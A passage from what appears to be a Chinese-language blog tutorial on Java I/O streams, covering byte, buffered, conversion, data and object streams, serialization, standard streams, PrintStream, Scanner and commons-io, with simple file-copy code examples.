<li><code>public int read(byte[] b,int off,int len)</code>：从输入流中读取一些字节数，并将它们存储到字节数组 b中，从b[off]开始存储，每次最多读取len个字节 。返回实际读取的字节个数。如果已经到达流末尾，没有数据可读，则返回-1。 </li>
<li><code>public void close()</code> ：关闭此输入流并释放与此流相关联的任何系统资源。<br> 说明：close()方法，当完成流的操作时，必须调用此方法，释放系统资源。</li>
</ul>
<p><strong>字节输出流：OutputStream</strong><br><code>java.io.OutputStream </code>抽象类是表示字节输出流的所有类的超类，将指定的字节信息写出到目的地。它定义了字节输出流的基本共性功能方法。</p>
<ul>
<li><code>public void write(int b)</code> ：将指定的字节输出流。虽然参数为int类型四个字节，但是只会保留一个字节的信息写出。</li>
<li><code>public void write(byte[] b)</code>：将 b.length字节从指定的字节数组写入此输出流。  </li>
<li><code>public void write(byte[] b, int off, int len)</code> ：从指定的字节数组写入 len字节，从偏移量 off开始输出到此输出流。  </li>
<li><code>public void flush() </code> ：刷新此输出流并强制任何缓冲的输出字节被写出。  </li>
<li><code>public void close()</code> ：关闭此输出流并释放与此流相关联的任何系统资源。<br> 说明：close()方法，当完成流的操作时，必须调用此方法，释放系统资源。</li>
</ul>
<p>因为内置缓冲区的原因，如果FileWriter不关闭输出流，无法写出字符到文件中。但是关闭的流对象，是无法继续写出数据的。如果我们既想写出数据，又想继续使用流，就需要<code>flush()</code> 方法了。</p>
<ul>
<li><code>flush()</code> ：刷新缓冲区，流对象可以继续使用。</li>
<li><code>close() </code>：先刷新缓冲区，然后通知系统释放资源。流对象不可以再被使用了。<br>注意：即便是flush()方法写出了数据，操作的最后还是要调用close方法，释放系统资源。<blockquote>
<p>在向文件写入数据时，如果不调用 flush()，数据可能会暂时留在内存中的缓冲区里，直到缓冲区满了或者流被关闭时才真正写入文件。这在某些需要即时写入数据的场景下是不可接受的，因此可以通过调用 flush() 方法来强制将缓冲区中的数据写出。</p>
</blockquote>
</li>
</ul>
<h5 id="FileInputStream"><a href="#FileInputStream" class="headerlink" title="FileInputStream"></a>FileInputStream</h5><p><code>java.io.FileInputStream </code>类是文件输入流，从文件中读取字节。</p>
<ul>
<li><code>FileInputStream(File file)</code>： 通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的 File对象 file命名。 </li>
<li><code>FileInputStream(String name)</code>： 通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的路径名 name命名。</li>
</ul>
<h5 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h5><p><code>java.io.FileOutputStream </code>类是文件输出流，用于将数据写出到文件。</p>
<ul>
<li><code>public FileOutputStream(File file)</code>：创建文件输出流，写出由指定的 File对象表示的文件。 </li>
<li><code>public FileOutputStream(String name)</code>： 创建文件输出流，指定的名称为写出文件。</li>
<li><code>public FileOutputStream(File file, boolean append)</code>：  创建文件输出流，指明是否在现有文件末尾追加内容。</li>
</ul>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//1 创建相关的File类对象</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">srcFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\workinenglish\\1 (1).jpg&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">desFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\workinenglish\\1.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2 创建相关的字节流</span></span><br><span class="line">        fileInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(srcFile);</span><br><span class="line">        fileOutputStream = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(desFile, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 数据的读写</span></span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ((len = fileInputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            fileOutputStream.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 4 关闭流资源</span></span><br><span class="line">            fileInputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong></p>
<ol>
<li>同Reader和Writer的注意点</li>
<li>字符流只能用于处理文本文件，不能处理非文本文件<br>字节流通常用于处理非文本文件，但若涉及文本文件的复制操作也可以使用字节流，但建议使用字符流</li>
</ol>
<h4 id="处理流"><a href="#处理流" class="headerlink" title="处理流"></a>处理流</h4><p><strong>！！使用处理流时必须在有节点流的基础上！！</strong></p>
<h5 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h5><p><code>为了提高数据读写的速度</code>，Java API提供了带缓冲功能的流类：缓冲流。</p>
<p>缓冲流要“套接”在相应的节点流之上，根据数据操作单位可以把缓冲流分为：</p>
<ul>
<li><strong>字节缓冲流</strong>：<code>BufferedInputStream</code>，<code>BufferedOutputStream</code> </li>
<li><strong>字符缓冲流</strong>：<code>BufferedReader</code>，<code>BufferedWriter</code><br>缓冲流的基本原理：在创建流对象时，内部会创建一个缓冲区数组（缺省使用<code>8192个字节(8Kb)</code>的缓冲区），通过缓冲区读写，减少系统IO次数，从而提高读写的效率。</li>
</ul>
<p><strong>字符缓冲流</strong></p>
<p><strong>构造器</strong></p>
<ul>
<li><code>public BufferedInputStream(InputStream in)</code> ：创建一个 新的字节型的缓冲输入流。 </li>
<li><code>public BufferedOutputStream(OutputStream out)</code>： 创建一个新的字节型的缓冲输出流。</li>
</ul>
<p><strong>特有方法</strong><br>字符缓冲流的基本方法与普通字符流调用方式一致，不再阐述，我们来看它们具备的特有方法。</p>
<ul>
<li>BufferedReader：<code>public String readLine()</code>: 读一行文字，不包括换行符，若返回null表示结束。 </li>
<li>BufferedWriter：<code>public void newLine()</code>: 写一行行分隔符,由系统属性定义符号。</li>
</ul>
<p><strong>字节缓冲流</strong></p>
<p><strong>构造器</strong></p>
<ul>
<li><code>public BufferedReader(Reader in)</code> ：创建一个新的字符型的缓冲输入流。 </li>
<li><code>public BufferedWriter(Writer out)</code>： 创建一个新的字符型的缓冲输出流。</li>
</ul>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bIS</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">BufferedOutputStream</span> <span class="variable">bOS</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//1 创建相关的File类对象</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">srcFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\workinenglish\\1 (1).jpg&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">desFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\workinenglish\\1-1.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2 创建相应的字节流、处理流</span></span><br><span class="line">        fileInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(srcFile);</span><br><span class="line">        fileOutputStream = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(desFile, <span class="literal">true</span>);</span><br><span class="line">        bIS = <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fileInputStream);</span><br><span class="line">        bOS = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(fileOutputStream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 数据的读写-使用处理流而非节点流读写</span></span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];<span class="comment">// 选择适当大小的缓冲区可以减少内存读写耗时</span></span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ((len = bIS.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            bOS.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//4 关闭流资源 先关外层后关内层，但关闭外层流可以自动关闭内层流，故</span></span><br><span class="line">            bIS.close();</span><br><span class="line">            bOS.close();</span><br><span class="line">            <span class="comment">//fileInputStream.close();省略</span></span><br><span class="line">            <span class="comment">//fileOutputStream.close();省略</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h5 id="转换流"><a href="#转换流" class="headerlink" title="转换流"></a>转换流</h5><p><strong>作用：转换流是字节与字符间的桥梁！</strong><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240719231301.png" alt="转换流的作用"></p>
<p>InputStreamReader：将一个输入型的字节流转为字符流<br>OutputStreamWriter：将一个输出型的字节流转为字符流</p>
<p><strong>InputStreamReader</strong> </p>
<p>转换流<code>java.io.InputStreamReader</code>，是Reader的子类，是从字节流到字符流的桥梁。它读取字节，并使用指定的字符集将其解码为字符。它的字符集可以由名称指定，也可以接受平台的默认字符集。 </p>
<p><strong>构造器</strong></p>
<ul>
<li><code>InputStreamReader(InputStream in)</code>: 创建一个使用默认字符集的字符流。 </li>
<li><code>InputStreamReader(InputStream in, String charsetName)</code>: 创建一个指定字符集的字符流。</li>
</ul>
<p><strong>OutputStreamWriter</strong></p>
<p>转换流<code>java.io.OutputStreamWriter</code> ，是Writer的子类，是从字符流到字节流的桥梁。使用指定的字符集将字符编码为字节。它的字符集可以由名称指定，也可以接受平台的默认字符集。 </p>
<p><strong>构造器</strong></p>
<ul>
<li><code>OutputStreamWriter(OutputStream in)</code>: 创建一个使用默认字符集的字符流。 </li>
<li><code>OutputStreamWriter(OutputStream in,String charsetName)</code>: 创建一个指定字符集的字符流。</li>
</ul>
<p><strong>字符集</strong></p>
<p>一个char占两个字节，是指在内存中占2个字节，采用的是Unicode字符集<br>gbk中一个汉字占2字节，utf-8中一个汉字占3字节，指的是文件存储中<br>因为char中无论用多少位表示的字符（汉字，英文字母）都占2字节，gbk等字符集中占用的字节数不一定（英文字母1B）</p>
<h5 id="对象流（重点）和数据流（了解）"><a href="#对象流（重点）和数据流（了解）" class="headerlink" title="对象流（重点）和数据流（了解）"></a>对象流（重点）和数据流（了解）</h5><p>Java提供了数据流和对象流来将内存中定义的变量（包括基本数据类型或引用数据类型）保存在文件中</p>
<hr>
<h6 id="数据流：DataOutputStream、DataInputStream"><a href="#数据流：DataOutputStream、DataInputStream" class="headerlink" title="数据流：DataOutputStream、DataInputStream"></a>数据流：DataOutputStream、DataInputStream</h6><ul>
<li>DataOutputStream：允许应用程序将基本数据类型、String类型的变量写入输出流中</li>
<li>DataInputStream：允许应用程序以与机器无关的方式从底层输入流中读取基本数据类型、String类型的变量。</li>
<li>数据流的弊端：只支持Java基本数据类型和字符串的读写，而不支持其它Java对象的类型。而ObjectOutputStream和ObjectInputStream既支持Java基本数据类型的数据读写，又支持Java对象的读写，所以重点介绍对象流ObjectOutputStream和ObjectInputStream</li>
</ul>
<p><strong>数据流中的方法：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span> <span class="title function_">readByte</span><span class="params">()</span>                <span class="type">short</span> <span class="title function_">readShort</span><span class="params">()</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">readInt</span><span class="params">()</span>                  <span class="type">long</span> <span class="title function_">readLong</span><span class="params">()</span></span><br><span class="line"><span class="type">float</span> <span class="title function_">readFloat</span><span class="params">()</span>              <span class="type">double</span> <span class="title function_">readDouble</span><span class="params">()</span></span><br><span class="line"><span class="type">char</span> <span class="title function_">readChar</span><span class="params">()</span>				 <span class="type">boolean</span> <span class="title function_">readBoolean</span><span class="params">()</span>					</span><br><span class="line">String <span class="title function_">readUTF</span><span class="params">()</span>               <span class="keyword">void</span> <span class="title function_">readFully</span><span class="params">(<span class="type">byte</span>[] b)</span></span><br></pre></td></tr></table></figure>
<p>数据流DataOutputStream中的方法：将上述的方法的read改为相应的write即可。</p>
<hr>
<h6 id="对象流：ObjectOutputStream、ObjectInputStream"><a href="#对象流：ObjectOutputStream、ObjectInputStream" class="headerlink" title="对象流：ObjectOutputStream、ObjectInputStream"></a>对象流：ObjectOutputStream、ObjectInputStream</h6><ul>
<li>ObjectOutputStream：将 Java 基本数据类型和对象写入字节输出流中。通过在流中使用文件可以实现Java各种基本数据类型的数据以及对象的持久存储。</li>
<li>ObjectInputStream：ObjectInputStream 对以前使用 ObjectOutputStream 写出的基本数据类型的数据和对象进行读入操作，保存在内存中。</li>
<li>对象流的强大之处就是可以把Java中的对象写入到数据源中，也能把对象从数据源中还原回来。</li>
</ul>
<p><strong>ObjectOutputStream中的构造器：</strong></p>
<p><code>public ObjectOutputStream(OutputStream out) </code>： 创建一个指定的ObjectOutputStream。</p>
<p><strong>ObjectOutputStream中的方法：</strong></p>
<ul>
<li>public void writeBoolean(boolean val)：写出一个 boolean 值。</li>
<li>public void writeByte(int val)：写出一个8位字节</li>
<li>public void writeShort(int val)：写出一个16位的 short 值</li>
<li>public void writeChar(int val)：写出一个16位的 char 值</li>
<li>public void writeInt(int val)：写出一个32位的 int 值</li>
<li>public void writeLong(long val)：写出一个64位的 long 值</li>
<li>public void writeFloat(float val)：写出一个32位的 float 值。</li>
<li>public void writeDouble(double val)：写出一个64位的 double 值</li>
<li>public void writeUTF(String str)：将表示长度信息的两个字节写入输出流，后跟字符串 s 中每个字符的 UTF-8 修改版表示形式。根据字符的值，将字符串 s 中每个字符转换成一个字节、两个字节或三个字节的字节组。注意，将 String 作为基本数据写入流中与将它作为 Object 写入流中明显不同。 如果 s 为 null，则抛出 NullPointerException。</li>
<li><code>public void writeObject(Object obj)</code>：写出一个obj对象</li>
<li>public void close() ：关闭此输出流并释放与此流相关联的任何系统资源</li>
</ul>
<p><strong>ObjectInputStream中的构造器：</strong></p>
<p><code>public ObjectInputStream(InputStream in) </code>： 创建一个指定的ObjectInputStream。</p>
<p><strong>ObjectInputStream中的方法：</strong></p>
<ul>
<li>public boolean readBoolean()：读取一个 boolean 值</li>
<li>public byte readByte()：读取一个 8 位的字节</li>
<li>public short readShort()：读取一个 16 位的 short 值</li>
<li>public char readChar()：读取一个 16 位的 char 值</li>
<li>public int readInt()：读取一个 32 位的 int 值</li>
<li>public long readLong()：读取一个 64 位的 long 值</li>
<li>public float readFloat()：读取一个 32 位的 float 值</li>
<li>public double readDouble()：读取一个 64 位的 double 值</li>
<li>public String readUTF()：读取 UTF-8 修改版格式的 String</li>
<li><code>public void readObject(Object obj)</code>：读入一个obj对象</li>
<li>public void close() ：关闭此输入流并释放与此流相关联的任何系统资源</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\workinenglish\\test\\b.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//序列化，将内存中的Java对象转换位文件中的数据或网络传输的数据</span></span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//写出数据即为序列化过程</span></span><br><span class="line">    <span class="comment">// String对象</span></span><br><span class="line">    oos.writeUTF(<span class="string">&quot;江山如此多娇&quot;</span>);</span><br><span class="line">    oos.flush();</span><br><span class="line">    </span><br><span class="line">    oos.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化，将文件中的数据或网络传输的数据还原为内存中的Java对象</span></span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取文件中对象即反序列化过程</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> ois.readUTF();</span><br><span class="line">    System.out.println(str);</span><br><span class="line">    ois.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h6 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h6><p><strong>1、何为对象序列化机制？</strong></p>
<p><code>对象序列化机制</code>允许把内存中的Java对象转换成平台无关的二进制流，从而允许把这种二进制流持久地保存在磁盘上，或通过网络将这种二进制流传输到另一个网络节点。&#x2F;&#x2F;当其它程序获取了这种二进制流，就可以恢复成原来的Java对象。</p>
<ul>
<li>序列化过程：用一个字节序列可以表示一个对象，该字节序列包含该<code>对象的类型</code>和<code>对象中存储的属性</code>等信息。字节序列写出到文件之后，相当于文件中<code>持久保存</code>了一个对象的信息。 </li>
<li>反序列化过程：该字节序列还可以从文件中读取回来，重构对象，对它进行<code>反序列化</code>。<code>对象的数据</code>、<code>对象的类型</code>和<code>对象中存储的数据</code>信息，都可以用来在内存中创建对象。</li>
</ul>
<p><strong>2、序列化机制的重要性</strong></p>
<p>序列化是 RMI（Remote Method Invoke、远程方法调用）过程的参数和返回值都必须实现的机制，而 RMI 是 JavaEE 的基础。因此序列化机制是 JavaEE 平台的基础。<br>序列化的好处，在于可将任何实现了Serializable接口的对象转化为<strong>字节数据</strong>，使其在保存和传输时可被还原。</p>
<p><strong>3、实现原理</strong></p>
<ul>
<li>序列化：用ObjectOutputStream类保存基本类型数据或对象的机制。方法为：<ul>
<li><code>public final void writeObject (Object obj)</code> : 将指定的对象写出。</li>
</ul>
</li>
<li>反序列化：用ObjectInputStream类读取基本类型数据或对象的机制。方法为：<ul>
<li><code>public final Object readObject ()</code> : 读取一个对象。</li>
</ul>
</li>
</ul>
<p><strong>类实现序列化的要求</strong></p>
<ol>
<li>需要实现Serializable接口<br>&#x3D;&#x3D;》否则序列化或反序列化会抛出<code>NotSerializableException</code></li>
<li>需要声明一个全局常量：<code>static final long serialVersionUID = 42234234L;</code>（数字自由自定，不可重复）<br>原本会自动生成，但为使类被修改(如网络传输后对方修改此类)后仍能唯一标识此类。（注1）<br>&#x3D;&#x3D;》否则当JVM反序列化对象时,报<code>InvalidClassException</code>,该类的序列版本号与从流中读取的类描述符的版本号不匹配 </li>
<li>自定义类的各个属性都必须是可序列化的<ul>
<li>基本数据类型的属性默认可以序列化</li>
<li>引用类型的属性需要实现Serializable接口。</li>
<li>不需要可序列化的属性必须注明是瞬态的，使用<code>transient</code> 关键字修饰。</li>
<li><code>静态（static）变量</code>的值不会序列化。因为静态变量的值不属于某个对象。<br>&#x3D;&#x3D;》否则当JVM反序列化对象时,报<code>InvalidClassException</code>,该类包含未知数据类型</li>
</ul>
</li>
</ol>
<p><strong>注意</strong>：</p>
<blockquote>
<ol>
<li><code>Serializable</code> 接口给需要序列化的类，提供了一个序列版本号：<code>serialVersionUID</code> 。凡是实现 Serializable接口的类都应该有一个表示序列化版本标识符的静态变量。serialVersionUID用来表明类的不同版本间的兼容性。简单来说，Java的序列化机制是通过在运行时判断类的serialVersionUID来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常(InvalidCastException)。如果类没有显示定义这个静态常量，它的值是Java运行时环境根据类的内部细节<code>自动生成</code>的。若类的实例变量做了修改，serialVersionUID <code>可能发生变化</code>。因此，建议显式声明。如果声明了serialVersionUID，即使在序列化完成之后修改了类导致类重新编译，则原来的数据也能正常反序列化，只是新增的字段值是默认值而已。</li>
<li>对于JVM可以反序列化对象，它必须是能够找到class文件的类。如果找不到该类的class文件，则抛出一个 <code>ClassNotFoundException</code> 异常。</li>
</ol>
</blockquote>
<h4 id="其他流"><a href="#其他流" class="headerlink" title="其他流"></a>其他流</h4><h6 id="标准输入、输出流"><a href="#标准输入、输出流" class="headerlink" title="标准输入、输出流"></a>标准输入、输出流</h6><p>System.in和System.out分别代表了系统标准的输入和输出设备，默认输入设备是：键盘，输出设备是：显示器</p>
<ul>
<li>System.in的类型是InputStream</li>
<li>System.out的类型是PrintStream，其是OutputStream的子类FilterOutputStream 的子类</li>
</ul>
<p>重定向：通过System类的setIn，setOut方法对默认设备进行改变。</p>
<ul>
<li>public static void setIn(InputStream in)</li>
<li>public static void setOut(PrintStream out)</li>
</ul>
<p><strong>拓展：</strong></p>
<p>System类中有三个常量对象：System.out、System.in、System.err<br>查看System类中这三个常量对象的声明：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">PrintStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">PrintStream</span> <span class="variable">err</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>奇怪的是，</p>
<ul>
<li>这三个常量对象有final声明，但是却初始化为null。final声明的常量一旦赋值就不能修改，那么null不会空指针异常吗？</li>
<li>这三个常量对象为什么要小写？final声明的常量按照命名规范不是应该大写吗？</li>
<li>这三个常量的对象有set方法？final声明的常量不是不能修改值吗？set方法是如何修改它们的值的？</li>
</ul>
<p>final声明的常量，表示在Java的语法体系中它们的值是不能修改的，而这三个常量对象的值是由C&#x2F;C++等系统函数进行初始化和修改值的，所以它们故意没有用大写，也有set方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Declare and initialize the string</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the string from the keyboard</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        string = br.readLine();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        System.out.println(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the string obtained from the keyboard</span></span><br><span class="line">    <span class="keyword">return</span> string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h5 id="打印流"><a href="#打印流" class="headerlink" title="打印流"></a>打印流</h5><p>实现将基本数据类型的数据格式转化为字符串输出。<br>打印流：<code>PrintStream</code>和<code>PrintWriter</code></p>
<ul>
<li>提供了一系列重载的print()和println()方法，用于多种数据类型的输出</li>
<li>PrintStream和PrintWriter的输出不会抛出IOException异常</li>
<li>PrintStream和PrintWriter有自动flush功能</li>
<li>PrintStream 打印的所有字符都使用平台的默认字符编码转换为字节。在需要写入字符而不是写入字节的情况下，应该使用 PrintWriter 类。</li>
<li>System.out返回的是PrintStream的实例</li>
</ul>
<p><strong>构造器</strong></p>
<ul>
<li>PrintStream(File file) ：创建具有指定文件且不带自动行刷新的新打印流。 </li>
<li>PrintStream(File file, String csn)：创建具有指定文件名称和字符集且不带自动行刷新的新打印流。 </li>
<li>PrintStream(OutputStream out) ：创建新的打印流。 </li>
<li>PrintStream(OutputStream out, boolean autoFlush)：创建新的打印流。 autoFlush如果为 true，则每当写入 byte 数组、调用其中一个 println 方法或写入换行符或字节 (‘\n’) 时都会刷新输出缓冲区。</li>
<li>PrintStream(OutputStream out, boolean autoFlush, String encoding) ：创建新的打印流。 </li>
<li>PrintStream(String fileName)：创建具有指定文件名称且不带自动行刷新的新打印流。 </li>
<li>PrintStream(String fileName, String csn) ：创建具有指定文件名称和字符集且不带自动行刷新的新打印流。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">    <span class="type">PrintStream</span> <span class="variable">ps</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintStream</span>(<span class="string">&quot;io.txt&quot;</span>);</span><br><span class="line">    ps.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    ps.println(<span class="number">1</span>);</span><br><span class="line">    ps.println(<span class="number">1.5</span>);</span><br><span class="line">    ps.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个重要应用：向文件输出，记录日志</p>
<h5 id="Scanner类"><a href="#Scanner类" class="headerlink" title="Scanner类"></a>Scanner类</h5><p><strong>构造方法</strong></p>
<ul>
<li>Scanner(File source) ：构造一个新的 Scanner，它生成的值是从指定文件扫描的。 </li>
<li>Scanner(File source, String charsetName) ：构造一个新的 Scanner，它生成的值是从指定文件扫描的。 </li>
<li>Scanner(InputStream source) ：构造一个新的 Scanner，它生成的值是从指定的输入流扫描的。 </li>
<li>Scanner(InputStream source, String charsetName) ：构造一个新的 Scanner，它生成的值是从指定的输入流扫描的。</li>
</ul>
<p><strong>常用方法：</strong></p>
<ul>
<li>boolean hasNextXxx()： 如果通过使用nextXxx()方法，此扫描器输入信息中的下一个标记可以解释为默认基数中的一个 Xxx 值，则返回 true。</li>
<li>Xxx nextXxx()： 将输入信息的下一个标记扫描为一个Xxx</li>
</ul>
<h5 id="apache-common包的使用"><a href="#apache-common包的使用" class="headerlink" title="apache-common包的使用"></a>apache-common包的使用</h5><p>IO技术开发中，代码量很大，而且代码的重复率较高，为此Apache软件基金会，开发了IO技术的工具类<code>commonsIO</code>，大大简化了IO开发。Apahce软件基金会属于第三方，（Oracle公司第一方，我们自己第二方，其他都是第三方）我们要使用第三方开发好的工具，需要添加jar包。</p>
<p><strong>导包及举例</strong></p>
<ul>
<li>在导入commons-io-2.5.jar包之后，内部的API都可以使用。</li>
<li>IOUtils类的使用</li>
<li>FileUtils类的使用</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">- 静态方法：IOUtils.copy(InputStream in,OutputStream out)传递字节流，实现文件复制。</span><br><span class="line">- 静态方法：IOUtils.closeQuietly(任意流对象)悄悄的释放资源，自动处理close()方法抛出的异常。</span><br><span class="line">- 静态方法：<span class="keyword">void</span> <span class="title function_">copyDirectoryToDirectory</span><span class="params">(File src,File dest)</span>：整个目录的复制，自动进行递归遍历</span><br><span class="line">          参数:</span><br><span class="line">          src:要复制的文件夹路径</span><br><span class="line">          dest:要将文件夹粘贴到哪里去         </span><br><span class="line">- 静态方法：<span class="keyword">void</span> <span class="title function_">writeStringToFile</span><span class="params">(File file,String content)</span>：将内容content写入到file中</span><br><span class="line">- 静态方法：String <span class="title function_">readFileToString</span><span class="params">(File file)</span>：读取文件内容，并返回一个String</span><br><span class="line">- 静态方法：<span class="keyword">void</span> <span class="title function_">copyFile</span><span class="params">(File srcFile,File 